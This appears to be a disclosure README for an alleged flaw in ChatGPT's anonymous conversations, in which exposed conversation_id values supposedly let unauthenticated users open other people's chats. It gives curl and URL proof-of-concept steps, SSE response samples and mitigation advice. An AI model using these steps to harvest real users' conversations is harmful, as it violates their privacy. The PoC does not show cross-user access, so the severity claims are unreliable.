## 📋 Overview

This repository documents a **critical security vulnerability** discovered in the ChatGPT platform's anonymous conversation system. The finding highlights unauthorized access to anonymous conversation data using exposed `conversation_id` values.

### 📅 Research Details
- **Discovery Date**: June 6, 2025
- **Time**: 21:35 GMT+3
- **Severity**: High - Privacy Breach
- **Status**: Reported to OpenAI

---

## 🔎 Discovery

The vulnerability was discovered through systematic analysis of ChatGPT's network traffic and API endpoints. The research revealed that anonymous conversations can be accessed by anyone with knowledge of the `conversation_id`.

### 🎯 Key Finding
> **Anonymous conversations are publicly accessible via direct URL manipulation without any authentication checks**

---

## ⚠️ Impact

### 🚨 Critical Risks
- **Privacy Breach**: Users believing their conversations are anonymous can have their data exposed
- **Data Leakage**: Sensitive information shared in "anonymous" sessions becomes publicly accessible
- **Session Hijacking**: Unauthorized access to ongoing conversations
- **Trust Violation**: Undermines user confidence in OpenAI's privacy claims

### 📊 Affected Users
- All users utilizing ChatGPT's anonymous conversation feature
- Estimated impact: **Potentially millions of anonymous sessions**

---

## 🛡️ Mitigation

### Immediate Actions Required
1. **Session-based Access Control**: Implement proper authentication for conversation access
2. **ID Obfuscation**: Hide `conversation_id` from client-side responses
3. **Time-based Expiry**: Limit anonymous conversation lifespan
4. **Rate Limiting**: Prevent bulk conversation harvesting

---

## 📊 Technical Details

### 🔧 Vulnerability Mechanics

#### Step 1: URL Manipulation
```bash
# Direct search access
https://chatgpt.com/?hints=search&q=your_query_here

# Direct text response
https://chatgpt.com/?hints=&q=your_query_here
```

#### Step 2: API Endpoint Analysis
```javascript
// Main endpoint
https://chatgpt.com/backend-anon/conversation

// Response structure
{
  "type": "conversation_detail_metadata",
  "conversation_id": "68432f63-3bd4-8001-8a53-d436f5cc0c75"
}
```

#### Step 3: Unauthorized Access
```bash
# Access any conversation without authentication
https://chatgpt.com/c/{conversation_id}
```

### 📡 Server-Sent Events (SSE) Response Analysis

The vulnerability is exposed through the SSE response format:

```javascript
event: delta_encoding
data: "v1"

event: delta
data: {
  "p": "", 
  "o": "add", 
  "v": {
    "message": {
      "id": "d7b43c7b-2eeb-40c3-bdaf-747fa76ff5fd",
      "author": {"role": "assistant"},
      "create_time": 1749233640.069953,
      "content": {"content_type": "text", "parts": [""]},
      "status": "in_progress",
      "model_slug": "gpt-4-1-mini"
    }
  }
}

// Critical vulnerability point
data: {
  "type": "conversation_detail_metadata",
  "conversation_id": "68432f63-3bd4-8001-8a53-d436f5cc0c75"  // ← EXPOSED
}
```

### 🎯 Proof of Concept

```bash
# 1. Start anonymous conversation
curl "https://chatgpt.com/?hints=search&q=test"

# 2. Extract conversation_id from network traffic
# 3. Access conversation directly
curl "https://chatgpt.com/c/68432f63-3bd4-8001-8a53-d436f5cc0c75"
```
